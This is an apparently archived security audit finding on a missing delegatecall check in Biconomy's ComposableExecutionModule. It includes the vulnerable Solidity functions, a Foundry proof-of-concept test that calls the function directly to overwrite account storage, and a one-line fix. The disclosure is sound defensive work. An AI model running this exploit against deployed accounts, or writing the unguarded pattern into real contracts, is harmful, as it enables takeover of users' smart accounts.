---
tags:
  - lang/solidity
  - sector/account
  - sector/staking
  - platform/pashov
  - has/github
  - has/poc
  - severity/high
  - blast-radius/cross-protocol
protocol: "[[Biconomy]]"
auditors:
  - "[[Pashov Audit Group]]"
report: "https://github.com/pashov/audits/blob/master/team/md/BiconomyComposability-security-review_2025-03-22.md"
genome:
  - "[[missing-modifier]]"
  - "[[ownership-takeover]]"
  - "[[cross-protocol]]"
  - "[[access-roles]]"
  - "[[vote-delegation-loop]]"
---
# [C-01] Missing DelegateCall Check

- id: 63148
- impact: HIGH
- protocol: BiconomyComposability_2025-03-22
- reporter: Pashov Audit Group
- source: https://github.com/pashov/audits/blob/master/team/md/BiconomyComposability-security-review_2025-03-22.md

## Summary


The `executeComposableDelegateCall` function in the `ComposableExecutionModule` does not ensure that it is called through a delegate call. This means that an attacker can use this function to perform unrestricted operations on a smart account by creating an `executeFromExecutor` request to the target account. Additionally, an attacker can also manipulate storage data by directly performing a `writeStorage` operation. It is recommended to restrict the use of `executeComposableDelegateCall` and ensure that it is always called through a delegate call operation.

## Details


## Severity

**Impact:** High

**Likelihood:** High

## Description

`executeComposableDelegateCall` is a function that allows accounts with the `ComposableExecutionModule` installed to use this functionality via `execute` with `CALLTYPE_DELEGATECALL`.

```solidity
    /// @notice It doesn't require access control as it is expected to be called by the account itself via .execute(mode = delegatecall)
    function executeComposableDelegateCall(ComposableExecution[] calldata executions) external {
        _executeComposable(executions, address(this), _executeExecutionDelegatecall);
    }
```

```solidity
    function _executeExecutionDelegatecall(ComposableExecution calldata execution, bytes memory composedCalldata) internal returns (bytes[] memory returnData) {
        returnData = new bytes[](1);
        returnData[0] = _execute(execution.to, execution.value, composedCalldata);
    }
```

```solidity

    function _execute(address target, uint256 value, bytes memory callData) internal virtual returns (bytes memory result) {
        /// @solidity memory-safe-assembly
        assembly {
            result := mload(0x40)
            if iszero(call(gas(), target, value, add(callData, 0x20), mload(callData), codesize(), 0x00)) {
                // Bubble up the revert if the call reverts.
                returndatacopy(result, 0x00, returndatasize())
                revert(result, returndatasize())
            }
            mstore(result, returndatasize()) // Store the length.
            let o := add(result, 0x20)
            returndatacopy(o, 0x00, returndatasize()) // Copy the returndata.
            mstore(0x40, add(o, returndatasize())) // Allocate the memory.
        } 
    }
```

However, this function does not ensure that it is called via a delegate call. An attacker can create an `executeFromExecutor` request to a target smart account that has the `ComposableExecutionModule` installed and call `executeComposableDelegateCall` on the module, allowing the attacker to perform unrestricted operations on the smart account.

Another scenario is where an attacker can manipulate `Storage` data by directly performing `writeStorage` inside the execution.

PoC : 

```solidity
    function test_change_storage_data() public {
        address alice = address(0xabcd);
        // via composability module
        _inputStaticCallOutputExecResult(address(mockAccountFallback), address(composabilityHandler));

        // previous slot b value
        bytes32 namespace = storageContract.getNamespace(address(mockAccountFallback), address(composabilityHandler));
        bytes32 SLOT_B_0 = keccak256(abi.encodePacked(SLOT_B, uint256(0)));
        bytes32 storedValueB = storageContract.readStorage(namespace, SLOT_B_0);
        console.logString("previous slot B value : ");
        console.logUint(uint256(storedValueB));
        // 1. call directly executeComposableDelegateCall, provide storage as target and construct write storage operation
        InputParam[] memory inputParamsCall = new InputParam[](1);
        inputParamsCall[0] = InputParam({
            fetcherType: InputParamFetcherType.RAW_BYTES,
            paramData: abi.encode(SLOT_B_0, 420, address(mockAccountFallback)),
            constraints: emptyConstraints
        });

        OutputParam[] memory outputParamsCall = new OutputParam[](0);

        ComposableExecution[] memory executions = new ComposableExecution[](1);
        executions[0] = ComposableExecution({
            to: address(storageContract),
            value: 0, // no value sent
            functionSig: storageContract.writeStorage.selector,
            inputParams: inputParamsCall, // no input parameters needed
            outputParams: outputParamsCall // store output of the function A() to the storage
        });

        vm.startPrank(alice);

          // Call function composability directly
        ComposableExecutionModule(address(composabilityHandler)).executeComposableDelegateCall(executions);

        vm.stopPrank();

        bytes32 storedValueBNew = storageContract.readStorage(namespace, SLOT_B_0);
        console.logString("new slot B value : ");
        console.logUint(uint256(storedValueBNew));
    }
```

Run the test : 

```
forge test --match-test test_change_storage_data -vvv
```

## Recommendations

Restrict `executeComposableDelegateCall` and make sure it always performed using delegate call operation.

```diff
    function executeComposableDelegateCall(ComposableExecution[] calldata executions) external {
+         require(THIS_ADDRESS != address(this), NotAllowed());
        _executeComposable(executions, address(this), _executeExecutionDelegatecall);
    }
```
